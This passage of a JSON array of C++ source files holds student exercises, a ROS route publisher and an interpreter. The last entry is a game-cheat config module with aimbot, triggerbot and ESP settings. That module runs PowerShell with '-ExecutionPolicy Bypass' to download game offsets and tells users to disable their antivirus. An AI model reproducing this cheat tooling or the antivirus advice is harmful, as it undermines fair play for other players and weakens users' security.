        j++;\n        }\n        k++;\n    }\n\n    // Copy remaining elements\n    while (i < n1) {\n        media[k] = L[i];\n        i++;\n        k++;\n    }\n\n    while (j < n2) {\n        media[k] = R[j];\n        j++;\n        k++;\n    }\n}\n\nvoid mergeSort(vector<Media>& media, int left, int right) {\n    if (left < right) {\n        int mid = left + (right - left) / 2;\n        mergeSort(media, left, mid);\n        mergeSort(media, mid + 1, right);\n        merge(media, left, mid, right);\n    }\n}\n\nint partition(vector<Media>& media, int low, int high) {\n    int pivot = media[high].points;\n    int i = (low - 1);\n\n    for (int j = low; j < high; j++) {\n        if (media[j].points > pivot) { // Sort in descending order by points\n            i++;\n            swap(media[i], media[j]);\n        }\n    }\n    swap(media[i + 1], media[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(vector<Media>& media, int low, int high) {\n    if (low < high) {\n        int pi = partition(media, low, high);\n        // cout << \"DEBUG: Partition index: \" << pi << \", Low: \" << low << \", High: \" << high << endl;\n        quickSort(media, low, pi - 1);\n        quickSort(media, pi + 1, high);\n    }\n}\n////////////////////////\n\n//Loading bar attempt\nvoid displayLoadingBar(int progress, int total) {\n    int barWidth = 36;\n    float ratio = static_cast<float>(progress) / total;\n    int filledWidth = static_cast<int>(barWidth * ratio);\n\n    cout << \"\\r[\";\n    for (int i = 0; i < barWidth; ++i) {\n        if (i < filledWidth) cout << \"=\";\n        else if (i == filledWidth) cout << \">\";\n        else cout << \" \";\n    }\n    cout << \"] \" << int(ratio * 100.0) << \"%\" << flush;\n}\n\nvector<string> split(const string& s, char delimiter) {\n    vector<string> tokens;\n    string token;\n    istringstream tokenStream(s);\n    while (getline(tokenStream, token, delimiter)) {\n        tokens.push_back(token);\n    }\n    return tokens;\n}\n\nint main() {\n    string filePath = \"./Project3_xcel.csv\"; //C://Users//skodi//CLionProjects//Project3//Project3_xcel.csv\";\n    ifstream file(filePath); // Open the CSV file\n    string line;\n\n    if (!file.is_open()) { // If file cannot open then program end with code 1\n        cerr << \"Could not open the file!\\n\";\n        return 1;\n    }\n\n    string userInput;\n    string userInput2;\n    string userFormatType;\n    int userMinimumRating;\n    string userGenreType;\n    vector<string> userGenres;\n    vector<string> badMaturityRatings;\n\n    cout \n        << \" ::::    ::::: ::::    :::  ::::::::  \\n\"\n        << \" +:+:+: :+:+:+ :+:+:   :+: :+:    :+: \\n\"\n        << \" +:+ +:+:+ +:+ :+:+:+  +:+ +:+        \\n\"\n        << \" +#+  +:+  +#+ +#+ +:+ +#+ +#+        \\n\"\n        << \" +#+       +#+ +#+  +#+#+# +#+        \\n\"\n        << \" #+#       #+# #+#   #+#+# #+#    #+# \\n\"\n        << \" ###       ### ###    ####  ########  \\n\"\n        << \"--------------------------------------\\n\"\n        << \"|       Movie Night Conundrum!       |\\n\"\n        << \"--------------------------------------\\n\"\n        << \"Let us help you decide what to watch tonight!\\n\"\n        << \"Take a short seven question quiz, and we'll give you your top 5 recommendations. Enter S to start!\\n\";\n    cin >> userInput;\n    while (userInput != \"S\") {\n        cout << \"You did not hi",
    "/*\n * File: SimpleTextEditor.cpp\n * --------------------------\n * This program implements a simple command-driven text editor, which is\n * used to test the EditorBuffer class.\n */\n\n#include <cctype>\n#include <iostream>\n// #include \"CSC3002OJActive/assignment4/buffer.h\"\n// #include \"CSC3002OJActive/assignment4/SimpleTextEditor.h\"\n#include \"buffer.h\"\n#include \"SimpleTextEditor.h\"\nusing namespace std;\n\n/*\n * Function: executeCommand\n * Usage: executeCommand(buffer, line);\n * ------------------------------------\n * Executes the command specified by line on the editor buffer.\n */\n\nvoid executeCommand(EditorBuffer & buffer, string line) {\n   switch (toupper(line[0])) {\n    case 'I': for (int i = 1; i < line.length(); i++) {\n                 buffer.insertCharacter(line[i]);\n              }\n              displayBuffer(buffer);\n              break;\n    case 'D': buffer.deleteCharacter(); displayBuffer(buffer); break;\n    case 'F': buffer.moveCursorForward(); displayBuffer(buffer); break;\n    case 'B': buffer.moveCursorBackward(); displayBuffer(buffer); break;\n    case 'J': buffer.moveCursorToStart(); displayBuffer(buffer); break;\n    case 'E': buffer.moveCursorToEnd(); displayBuffer(buffer); break;\n    case 'H': printHelpText(); break;\n    case 'Q': exit(0);\n    default:  cout << \"Illegal command\" << endl; break;\n   }\n}\n\n/*\n * Function: displayBuffer\n * Usage: displayBuffer(buffer);\n * -----------------------------\n * Displays the state of the buffer including the position of the cursor.\n */\n\nvoid displayBuffer(EditorBuffer & buffer) {\n   string str = buffer.getText();\n   for (int i = 0; i < str.length(); i++) {\n      cout << \" \" << str[i];\n   }\n   cout << endl;\n   cout << string(2 * buffer.getCursor(), ' ') << \"^\" << endl;\n}\n\n/*\n * Function: printHelpText\n * Usage: printHelpText();\n * -----------------------\n * Displays a message showing the legal commands.\n */\n\nvoid printHelpText() {\n   cout << \"Editor commands:\" << endl;\n   cout << \"  Iabc  Inserts the characters abc at the cursor position\" << endl;\n   cout << \"  F     Moves the cursor forward one character\" << endl;\n   cout << \"  B     Moves the cursor backward one character\" << endl;\n   cout << \"  D     Deletes the character after the cursor\" << endl;\n   cout << \"  J     Jumps to the beginning of the buffer\" << endl;\n   cout << \"  E     Jumps to the end of the buffer\" << endl;\n   cout << \"  H     Prints this message\" << endl;\n   cout << \"  Q     Exits from the editor program\" << endl;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n\n// Base class for SQL Statements\nclass Statement {\npublic:\n  virtual ~Statement() = default;\n  virtual std::string toString() const = 0;\n};\n\n// Base class for all expressions\nclass Expression {\npublic:\n    virtual ~Expression() = default;\n    virtual std::string toString() const = 0;\n};\n\n// Enum class for SQL binary operators\nenum class BinaryOperator { Eq, Neq, Lt, LtEq, Gt, GtEq, Plus, Minus, Mul, Div, And, Or };\n\n// Enum class for SQL unary operators\nenum class UnaryOperator { Plus, Minus };\n\n// Enum class for SQL constraints\nenum class Constraint {\n    PrimaryKey,\n    Unique\n};\n\n// Derived class for CREATE statements\nclass Create : public Statement {\nprivate:\n  std::string name; // table name\n  std::vector<Column> columns; // table columns\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Derived class for SELECT statements\nclass Select : public Statement {\nprivate:\n    std::vector<Expression*> columns;\n    std::string from;\n    Expression* where;\n    std::vector<Expression*> orderBy;\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Derived class for DELETE statements\nclass Delete : public Statement {\nprivate:\n    std::string from;\n    Expression* where;\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Derived class for UPDATE statements\nclass Update : public Statement {\nprivate:\n    std::string table;\n    std::vector<Assignment*> columns;\n    Expression* where;\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Derived class for INSERT statements\nclass Insert : public Statement {\nprivate:\n    std::string into;\n    std::vector<std::string> columns;\n    std::vector<Expression*> values;\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Derived class for DROP statement\nclass Drop : public Statement {\nprivate:\n  std::string name; // table name\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Class to represent an Assignment in SQL\nclass Assignment {\nprivate:\n  std::string identifier;  // The column name or identifier\n  Expression* value;       // The expression assigned to the column\n};\n\n// Class to represent a Column in SQL\nclass Column {\nprivate:\n  std::string name;                      // The name of the column\n  DataType dataType;                     // The data type of the column\n  std::vector<Constraint*> constraints;  // Constraints on the column\n  Column(const std::string& name, DataType dataType, std::vector<Constraint*> constraints);\npublic:\n  // Static method to create a new Column without constraints\n  static Column newColumn(const std::string& name, DataType dataType);\n  // Static method to create a Column with PrimaryKey constraint\n  static Column primaryKey(const std::string& name, DataType dataType);\n  // Static method to create a Column with Unique constraint\n  static Column unique(const std::string& name, DataType dataType);\n};\n\n// Derived class for identifiers\nclass Identifier : public Expression {\nprivate:\n  std::string ident;\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Derived class for values\nclass Value : public Expression {\nprivate:\n  Type type;\n  std::string str_val;\n  bool bool_val;\n  int64_t num_val;\npublic:\n  enum class Type { String, Bool, Number };\n  std::string toString() const {  /* TODO */ }\n}\n\n// Derived class for wildcards\nclass Wildcard : public Expression {\npublic:\n    std::string toString() const {  /* TODO */ }\n};\n\n// Derived class for binary operations\nclass BinaryOperation : public Expression {\nprivate:\n  Expression* left;\n  BinaryOperator op;\n  Expression* right;\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Derived class for unary operations\nclass UnaryOperation : public Expression {\nprivate:\n  UnaryOperator op;\n  Expression* expr;\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Derived class for nested expressions\nclass Nested : public Expression {\nprivate:\n  Expression* expr;\npublic:\n  std::string toString() const {  /* TODO */ }\n};\n\n// Class for SQL data types\nclass DataType {\nprivate:\n  Type type;\n  size_t size; // Used for VARCHAR, example: VARCHAR(50), VARCHAR(100), VARCHAR(255)\npublic:\n  enum class Type { Int, Bool, Varchar };\n};\n",
    "#include<iostream>\r\n/* for randum number genrater */\r\n#include<cstdlib>\r\n#include<ctime>\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    /*Intilazer randum number*/\r\n    srand(time(0));\r\n    \r\n    //Array to\\ store option  \r\n    string option[3]={\"rook\",\"peper\",\"Scissors\"};\r\n\r\n    while (true) {\r\n        // Get user's choice\r\n        int userChoice;\r\n        cout << \"Enter your choice (0 for Rock, 1 for Paper, 2 for Scissors, 3 to Quit): \";\r\n        cin >> userChoice;\r\n\r\n        if (userChoice == 3) \r\n        {\r\n            break; // Exit the loop if user chooses to quit\r\n        }\r\n        // Genrate randum computers choise \r\n        int comuterChoise = rand() % 3;\r\n\r\n        // Ditermine the continue or not\r\n        if (userChoice == comuterChoise) {\r\n            cout << \"It's a tie!\" << endl;\r\n        }\r\n        \r\n        if (userChoice<0 ||/*or oprater*/ userChoice>3)\r\n        {\r\n            cout<<\"invalid input please enter a number between 0 and 3\"<<endl;\r\n            break;\r\n        }\r\n        \r\n        // display both choise\r\n        cout<<\"this is ur choise \"<<option[userChoice]<<endl;\r\n        cout<<\"this is a com choise \"<<option[comuterChoise]<<endl;\r\n\r\n        // Ditermine the winner\r\n        if ((userChoice == 0 && comuterChoise == 2) || (userChoice == 1 && comuterChoise == 0) ||\r\n                   (userChoice == 2 && comuterChoise == 1)) {\r\n            cout << \"You win!\" << endl;\r\n        }\r\n        else{\r\n            cout<<\"Your loose!\";\r\n        }\r\n        cout<<endl; //it is for blank line\r\n    }\r\n\r\n    cout<<\"thank u for playing wist again\"<<endl;\r\n}",
    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\n#define UNASSIGNED 0\n#define N 9\n\n// Function to print the Sudoku grid\nvoid printGrid(int grid[N][N]) {\n    for (int row = 0; row < N; row++) {\n        for (int col = 0; col < N; col++) {\n            cout << grid[row][col] << \" \";\n        }\n        cout << endl;\n    }\n}\n\n// Function to check if it's safe to place a number in a cell\nbool isSafe(int grid[N][N], int row, int col, int num) {\n    // Check if 'num' is not already placed in the current row, column, and 3x3 subgrid\n    for (int x = 0; x < N; x++) {\n        if (grid[row][x] == num || grid[x][col] == num || \n            grid[row - row % 3 + x / 3][col - col % 3 + x % 3] == num) {\n            return false;\n        }\n    }\n    return true;\n}\n\n// Function to solve the Sudoku using backtracking\nbool solveSudoku(int grid[N][N]) {\n    int row, col;\n    bool isEmpty = true;\n    \n    for (row = 0; row < N; row++) {\n        for (col = 0; col < N; col++) {\n            if (grid[row][col] == UNASSIGNED) {\n                isEmpty = false;\n                break;\n            }\n        }\n        if (!isEmpty) {\n            break;\n        }\n    }\n\n    // No unassigned position is found, puzzle solved\n    if (isEmpty) {\n        return true;\n    }\n\n    // Try digits from 1 to 9\n    for (int num = 1; num <= 9; num++) {\n        // Check if it is safe to place the number\n        if (isSafe(grid, row, col, num)) {\n            grid[row][col] = num;\n            // Return true if solving the rest of the grid is successful\n            if (solveSudoku(grid)) {\n                return true;\n            }\n            // Failure, unmake and try again\n            grid[row][col] = UNASSIGNED;\n        }\n    }\n\n    return false; // Triggers backtracking\n}\n\nint main() {\n    int grid[N][N];\n\n    cout << \"Enter the Sudoku puzzle (use 0 for empty cells):\" << endl;\n    for (int row = 0; row < N; row++) {\n        for (int col = 0; col < N; col++) {\n            cin >> grid[row][col];\n        }\n    }\n\n    if (solveSudoku(grid)) {\n        printGrid(grid);\n    } else {\n        cout << \"No solution exists.\" << endl;\n    }\n\n    return 0;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nint fib(int indis)\r\n{\r\n\tif(indis<=1) return 1;\r\n\telse{\r\n\treturn fib(indis-2)+fib(indis-1);\r\n\t}\r\n}\r\n\r\nint iterative(int n)\r\n{\r\n\t \r\n\t    if (n == 1) return 1;\r\n\t    int prevPrev = 1;\r\n\t    int prev=1;\r\n\t    int currentNumber;\r\n\t    for (int i = 2; i <=n; i++) {\r\n\t        currentNumber = prevPrev + prev; //current =3oldu\r\n\t        prevPrev = prev;\t//prevprev 2\r\n\t        prev = currentNumber;\t//prev=3 oldu prevprev=2 oldu\r\n\t}\r\n\treturn currentNumber;\r\n\t}\r\n\r\nint main()\r\n{\r\n\r\nint a=0;\r\na=iterative(5);\r\nint b=fib(5);\r\n\tcout<<b;\r\n\treturn 0;\r\n}\r\n/*\r\n public static int fibonacciLoop(int nthNumber) {\r\n        //use loop\r\n        int previouspreviousNumber, previousNumber = 0, currentNumber = 1;\r\n\r\n        for (int i = 1; i < nthNumber ; i++) {\r\n\r\n            previouspreviousNumber = previousNumber;\r\n\r\n            previousNumber = currentNumber;\r\n\r\n            currentNumber = previouspreviousNumber + previousNumber;\r\n\r\n        }\r\n        return currentNumber;\r\n    }\r\n\r\n*/",
    "#include \"route_generator/route.hpp\"\n\nnamespace route_component\n{\n\nRoutePublisher::RoutePublisher(const rclcpp::NodeOptions & node_options) : Node(\"route_publisher\", node_options)\n{\n  dist_threshold_ = this->declare_parameter(\"dist_threshold\", 15.0);\n\n  pose_sub_ = this->create_subscription<nav_msgs::msg::Odometry>(\n    \"/localization/kinematic_state\", rclcpp::QoS(1), std::bind(&RoutePublisher::pose_Callback, this,std::placeholders::_1));\n\n  route_pub_ = this->create_publisher<LaneletRoute>(\n    \"/planning/mission_planning/route\", rclcpp::QoS(1).transient_local());\n  \n  checkpoint_vec_.push_back({-95.95, -297.46});\n  checkpoint_vec_.push_back({-237.16, -402.70});\n  checkpoint_vec_.push_back({-133.35, 108.05});\n  checkpoint_vec_.push_back({-13.59, 3.99});\n\n  generate_route_executed_ = false;\n}\n\nvoid RoutePublisher::generate_route(const int & closest_checkpoint)\n{\n  LaneletRoute route_msg;\n\n  if(!generate_route_executed_)\n  {\n    route_msg = create_route1();\n    route_pub_->publish(route_msg);\n  }\n\n  switch(closest_checkpoint)\n  {\n    case 1:\n    {\n      route_msg = create_route2();\n      route_pub_->publish(route_msg);\n      RCLCPP_INFO(rclcpp::get_logger(\"route_publisher\"),\"published 1st route\");\n      break;\n    }\n    case 2:\n    {\n      route_msg = create_route3();\n      route_pub_->publish(route_msg);\n      RCLCPP_INFO(rclcpp::get_logger(\"route_publisher\"),\"published 2nd route\");\n      break;\n    }\n    case 3:\n    {\n      route_msg = create_route4();\n      route_pub_->publish(route_msg);\n      RCLCPP_INFO(rclcpp::get_logger(\"route_publisher\"),\"published 3rd route\");\n      break;\n    }\n    case 4:\n    {\n      route_msg = create_route1();\n      route_pub_->publish(route_msg);\n      RCLCPP_INFO(rclcpp::get_logger(\"route_publisher\"),\"published 4th route\");\n      break;\n    }\n    default:\n    {\n      break;\n    }\n  }\n  generate_route_executed_ = true;\n}\n\nvoid RoutePublisher::pose_Callback(const nav_msgs::msg::Odometry::SharedPtr pose_msg)\n{\n  const geometry_msgs::msg::Point position = pose_msg->pose.pose.position;\n  const int closest_checkpoint = calc_closest_checkpoint(position);\n  generate_route(closest_checkpoint);\n}\n\nint RoutePublisher::calc_closest_checkpoint(const geometry_msgs::msg::Point & position)\n{\n  for(int i = 0; i < checkpoint_vec_.size(); i++)\n  {\n    float x_diff = checkpoint_vec_[i].x - position.x;\n    float y_diff = checkpoint_vec_[i].y - position.y;\n\n    if(std::abs(x_diff) + std::abs(y_diff) < dist_threshold_)\n    {\n      return i+1;\n    }\n  }\n  return 0;\n}\n\n//[TO-DO]change to single function\nLaneletRoute RoutePublisher::create_route1()\n{\n  LaneletRoute route_msg;\n  LaneletSegment segment;\n  LaneletPrimitive primitive;\n\n  route_msg.header.stamp = this->get_clock()->now();\n  route_msg.header.frame_id = \"map\";\n  \n  route_msg.start_pose.position.x = pose_msg_.pose.pose.position.x;\n  route_msg.start_pose.position.y = pose_msg_.pose.pose.position.y;\n  route_msg.start_pose.position.z = pose_msg_.pose.pose.position.z;\n\n  route_msg.start_pose.orientation.x = pose_msg_.pose.pose.orientation.x;\n  route_msg.start_pose.orientation.y = pose_msg_.pose.pose.orientation.y;\n  route_msg.start_pose.orientation.z = pose_msg_.pose.pose.orientation.z;\n  route_msg.start_pose.orientation.w = pose_msg_.pose.pose.orientation.w;\n\n  route_msg.goal_pose.position.x = -254.95880126953125;\n  route_msg.goal_pose.position.y = -370.8807678222656;\n  route_msg.goal_pose.position.z = 15.313650152117422;\n\n  route_msg.goal_pose.orientation.x = 0.0;\n  route_msg.goal_pose.orientation.y = 0.0;\n  route_msg.goal_pose.orientation.z = -0.5042373751665669;\n  route_msg.goal_pose.orientation.w = 0.8635650927898434;\n\n  segment.preferred_primitive.id = 524;\n  primitive.id = 524;\n  primitive.primitive_type = \"lane\";\n  segment.primitives.push_back(primitive);\n  route_msg.segments.push_back(segment);\n\n  segment.preferred_primitive.id = 172;\n  primitive.id = 172;\n  primitive.primitive_type = \"lane\";\n  segment.primitives.clear();\n  segment.primitives.push_back(primitive);\n  route_msg.segments.push_back(segment);\n\n  return route_msg;\n}\n\nLaneletRoute RoutePublisher::create_route2()\n{\n  LaneletRoute route_msg;\n  LaneletSegment segment;\n  LaneletPrimitive primitive;\n\n  route_msg.header.stamp = this->get_clock()->now();\n  route_msg.header.frame_id = \"map\";\n  \n  route_msg.start_pose.position.x = pose_msg_.pose.pose.position.x;\n  route_msg.start_pose.position.y = pose_msg_.pose.pose.position.y;\n  route_msg.start_pose.position.z = pose_msg_.pose.pose.position.z;\n\n  route_msg.start_pose.orientation.x = pose_msg_.pose.pose.orientation.x;\n  route_msg.start_pose.orientation.y = pose_msg_.pose.pose.orientation.y;\n  route_msg.start_pose.orientation.z = pose_msg_.pose.pose.orientation.z;\n  route_msg.start_pose.orientation.w = pose_msg_.pose.pose.orientation.w;\n\n  route_msg.goal_pose.position.x = -126.45575714111328;\n  route_msg.goal_pose.position.y = 45.626609802246094;\n  route_msg.goal_pose.position.z = 0.1628499615996558;\n\n  route_msg.goal_pose.orientation.x",
    "#include \"ast.h\"\n#include <iostream>\n#include <stdexcept>\n#include <string>\n#include <variant>\n\nScopedSymbolTable *AST::scope;\n/////////// AST\nASTValue AST::solve() {\n  throw std::runtime_error(\"Error: AST::solve() not implemented\");\n}\n\n/////////// StatementListAST\nASTValue StatementListAST::solve() {\n  if (this->scope == nullptr)\n    this->scope = new ScopedSymbolTable(\"global\");\n  for (auto &statement : this->statements)\n    statement->solve();\n  return 0;\n}\n\n/////////// IfStatementAST\nbool ASTValueIsTrue(ASTValue value) {\n  return std::holds_alternative<int>(value)\n             ? std::get<int>(value) != 0\n             : std::get<std::string>(value) != \"\";\n}\n\nASTValue IfStatementAST::solve() {\n  ASTValue value = this->condition->solve();\n\n  if (ASTValueIsTrue(value)) {\n    this->scope = this->scope->newScope(\"if\");\n    this->ifStatements->solve();\n    this->scope = this->scope->previousScope;\n  }\n  return 0;\n}\n\n\nASTValue WhileStatementAST::solve() {\n\n  while (ASTValueIsTrue(this->condition->solve())) {\n    this->scope = this->scope->newScope(\"if\");\n    this->ifStatements->solve();\n    this->scope = this->scope->previousScope;\n  }\n  return 0;\n}\n\n/////////// ConditionalAST\n/*ASTValue ConditionalAST::solve() {*/\n/*  ASTValue leftValue = this->left->solve();*/\n/*  ASTValue rightValue = this->right->solve();*/\n/*  if (leftValue.index() != rightValue.index())*/\n/*    throw std::runtime_error(*/\n/*        \"Error: ConditionalAST::solve() different types\");*/\n/*  switch (this->op.getValue()[0]) {*/\n/*    case '<':*/\n/*      return leftValue < rightValue;*/\n/*    case '>':*/\n/*      return leftValue > rightValue;*/\n/*    default:*/\n/*      throw std::runtime_error(*/\n/*          \"Error: ConditionalAST::solve() invalid operator\");*/\n/*  }*/\n/*}*/\n\n/////////// FunctionAST\nASTValue FunctionAST::solve() {\n  FuncSymbol *func =\n      new FuncSymbol(this->identifier.getValue(), this->statements);\n  this->scope->set(func);\n  return 0;\n}\n\n/////////// AssignmentVariableAST\nASTValue AssignmentVariableAST::solve() {\n  this->scope->update(this->identifier.getValue(), this->value->solve());\n  return 0;\n}\n\n/////////// VariableDeclarationAST\nASTValue VariableDeclarationAST::solve() {\n  Token type = this->type;\n  if (type.getValue() == \"NUMBER\")\n    this->scope->set(new VarSymbol(this->identifier.getValue(),\n                                   this->scope->getSymbol(\"NUMBER\"),\n                                   this->value->solve()));\n  else if (type.getValue() == \"STRING\")\n    this->scope->set(new VarSymbol(this->identifier.getValue(),\n                                   this->scope->getSymbol(\"STRING\"),\n                                   this->value->solve()));\n  else\n    throw std::runtime_error(\n        \"Error: VariableDeclarationAST::solve() invalid type\");\n  return 0;\n}\n\n/////////// InputStreamAST\nASTValue InputStreamAST::solve() {\n  for (auto &identifier : this->identifiers) {\n    ASTValue value = this->scope->getValue(identifier.getValue());\n    if (std::holds_alternative<int>(value)) {\n      int input;\n      std::cin >> input;\n      this->scope->update(identifier.getValue(), input);\n    } else if (std::holds_alternative<std::string>(value)) {\n      std::string input;\n      std::cin >> input;\n      this->scope->update(identifier.getValue(), input);\n    } else {\n      throw std::runtime_error(\n          \"Error: InputStreamAST::solve() invalid identifier\");\n    }\n  }\n  return 0;\n}\n\n/////////// OutputStreamAST\nASTValue OutputStreamAST::solve() {\n  int cnt = this->outputs.size() - 1;\n  for (auto &output : this->outputs) {\n    ASTValue outputValue = output->solve();\n    if (std::holds_alternative<std::string>(outputValue))\n      std::cout << std::get<std::string>(outputValue);\n    else\n      std::cout << std::get<int>(outputValue);\n    if (cnt--)\n      std::cout << \" \";\n  }\n  std::cout << std::endl;\n  return (int)this->outputs.size();\n}\n\n/////////// BinaryOperatorAST\nASTValue BinaryOperatorAST::solve() {\n  ASTValue leftValue = this->left->solve();\n  ASTValue rightValue = this->right->solve();\n  switch (this->op.getValue()[0]) {\n  case '+':\n    if (std::holds_alternative<std::string>(leftValue))\n      return std::get<std::string>(leftValue) +\n             std::get<std::string>(right->solve());\n    return std::get<int>(leftValue) + std::get<int>(rightValue);\n  case '-':\n    return std::get<int>(leftValue) - std::get<int>(rightValue);\n  case '*':\n    return std::get<int>(leftValue) * std::get<int>(rightValue);\n  case '/':\n    return std::get<int>(leftValue) / std::get<int>(rightValue);\n  case '%':\n    return std::get<int>(leftValue) % std::get<int>(rightValue);\n\n  // logical operators\n  case '&':\n    if(this->op.getValue() == \"&&\")\n        return ASTValueIsTrue(leftValue) && ASTValueIsTrue(rightValue);\n    throw std::runtime_error(\n        \"Error: BinaryOperatorAST::solve() invalid operator\");\n  case '|':\n    if(this->op.getValue() == \"||\")\n        return ASTValueIsTrue(leftValue) || ASTValueIsTrue(rightValue);\n    throw std::runtime",
    "#include <iostream>\r\n#include <fstream>\r\n#include <windows.h>\r\n#include <string>\r\n#include <shlobj.h>\r\n#include <filesystem>\r\n#include \"json.h\"\r\n#include \"config.h\"\r\n#include \"options.h\"\r\n\r\nusing json = nlohmann::json;\r\n\r\nvoid Config::getDocumentsFolderPath() {\r\n    char path[MAX_PATH];\r\n    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, path))) {\r\n        this->configPath = std::string(path);\r\n    }\r\n    else {\r\n        std::cout << \"[cheat]: Can't get documents path\" << '\\n';\r\n    }\r\n}\r\n\r\nbool Config::createConfigFolder() {\r\n    HRESULT result = SHCreateDirectoryExA(NULL, (this->configPath + \"\\\\Vireless\").c_str(), NULL);\r\n    this->configPath = configPath + \"\\\\Vireless\";\r\n\r\n    if (result == ERROR_SUCCESS) {\r\n        std::cout << \"[cheat]: Config folder created \" << '\\n';\r\n        return true;\r\n    }\r\n    else if (result == ERROR_ALREADY_EXISTS) {\r\n        std::cout << \"[cheat]: Config folder already created\" << '\\n';\r\n        return true;\r\n    }\r\n    else {\r\n        std::cout << \"[cheat]: Can't create config folder, try disabling your antivirus or adding a cheat to the exceptions \" << '\\n';\r\n        return false;\r\n    }\r\n}\r\n\r\nbool Config::downloadOffsetsFromGithub() {\r\n    // \u00d1\u00ee\u00e7\u00e4\u00e0\u00e5\u00ec \u00ea\u00ee\u00ec\u00e0\u00ed\u00e4\u00f3 \u00e4\u00eb\u00ff \u00e2\u00fb\u00e7\u00ee\u00e2\u00e0 PowerShell \u00f1\u00ea\u00f0\u00e8\u00ef\u00f2\u00e0\r\n    std::string urlOffsets = \"https://raw.githubusercontent.com/a2x/cs2-dumper/main/output/offsets.json\";\r\n    std::string commandOffsets = \"Invoke-WebRequest -Uri \\\"\" + urlOffsets + \"\\\" -OutFile \\\"\" + this->offsetsPath + \"\\\\offsetsDump.json\" + \"\\\"\";\r\n\r\n    std::string urlClient = \"https://raw.githubusercontent.com/a2x/cs2-dumper/main/output/client_dll.json\";\r\n    std::string commandClient = \"Invoke-WebRequest -Uri \\\"\" + urlClient + \"\\\" -OutFile \\\"\" + this->offsetsPath + \"\\\\clientDump.json\" + \"\\\"\";\r\n\r\n    std::string fullCommand = \"powershell -ExecutionPolicy Bypass -Command \\\"\" + commandOffsets + \"\\\"\";\r\n\r\n    int result = std::system(fullCommand.c_str());\r\n\r\n    fullCommand = \"powershell -ExecutionPolicy Bypass -Command \\\"\" + commandClient + \"\\\"\";\r\n\r\n    result = std::system(fullCommand.c_str());\r\n\r\n    if (result != 0) {\r\n        std::cerr << \"[cheat]: Failed to download offsets \" << '\\n';\r\n        return false;\r\n    }\r\n\r\n    return true;\r\n}\r\n\r\nbool Config::createOffsetsFolder(){\r\n    HRESULT result = SHCreateDirectoryExA(NULL, (this->configPath + \"\\\\Offsets\").c_str(), NULL);\r\n\r\n    if (result == ERROR_SUCCESS) {\r\n        std::cout << \"[cheat]: Offsets folder created \" << '\\n';\r\n    }\r\n    else if (result == ERROR_ALREADY_EXISTS) {\r\n        std::cout << \"[cheat]: Offsets folder already created\" << '\\n';\r\n    }\r\n    else {\r\n        std::cout << \"[cheat]: Can't create offsets folder \" << '\\n';\r\n        return false;\r\n    }\r\n\r\n    this->offsetsPath = this->configPath + \"\\\\Offsets\";\r\n\r\n    std::ofstream clientDump(this->offsetsPath + \"\\\\clientDump.json\");\r\n    std::ofstream offsetsDump(this->offsetsPath + \"\\\\offsetsDump.json\");\r\n\r\n    if (clientDump.is_open() && offsetsDump.is_open()) {\r\n        clientDump.close();\r\n        offsetsDump.close();\r\n    }\r\n\r\n    return true;\r\n}\r\n\r\nvoid Config::getConfigFiles() {\r\n    try {\r\n        if (!std::filesystem::exists(this->configPath) || !std::filesystem::is_directory(this->configPath)) {\r\n            std::cerr << \"[cheat]: Path doesn't exist \" << configPath << std::endl;\r\n            return;\r\n        }\r\n\r\n        for (const auto& entry : std::filesystem::directory_iterator(this->configPath)) {\r\n            if (entry.is_regular_file() && entry.path().extension() == \".json\") {\r\n                this->configFiles.push_back(entry.path().filename().string());\r\n            }\r\n        }\r\n    }\r\n    catch (const std::filesystem::filesystem_error& e) {\r\n        std::cerr << \"[cheat]: Error with filesystem \" << e.what() << '\\n';\r\n    }\r\n    catch (const std::exception& e) {\r\n        std::cerr << \"[cheat]: Unable to loop through config files \" << e.what() << '\\n';\r\n    }\r\n}\r\n\r\nvoid Config::vectorStrToChar() {\r\n    for (const auto& file : config.configFiles) {\r\n        this->configNames.push_back(file.c_str());\r\n    }\r\n}\r\n\r\nvoid Config::update(){\r\n    this->configFiles.clear();\r\n    this->configNames.clear();\r\n    this->getConfigFiles();\r\n    this->vectorStrToChar();\r\n}\r\n\r\njson imvec4ToJson(const ImVec4& color) {\r\n    return json{ {\"r\", color.x}, {\"g\", color.y}, {\"b\", color.z}, {\"a\", color.w} };\r\n}\r\n\r\nbool Config::saveConfig(std::string configName) {\r\n    json config;\r\n\r\n    config[\"name\"] = \"Vireless\";\r\n    config[\"version\"] = \"1.0\";\r\n    config[\"config-name\"] = \"test\";\r\n    config[\"menu\"] = {\r\n        {\"Aim\", menu::bEnableAim},\r\n        {\"FOV\", menu::bFOV},\r\n        {\"Smooth\", menu::bSmooth},\r\n        {\"Triggerbot\", menu::bEnableTriggerbot},\r\n        {\"Esp\", menu::bEnableESP},\r\n        {\"2D-box\", menu::bEnableBox2D},\r\n        {\"2D-box-lines\", menu::bEnableBox2DLines},\r\n        {\"2D-box-fill\", menu::bEnableBox2DFill},\r\n        {\"3D-box\", menu::bEnableBox3D},\r\n        {\"3D-box-anim\", menu::bEnableBox3DAnim},\r\n        {\"Name\", menu::bEnableName}, ",
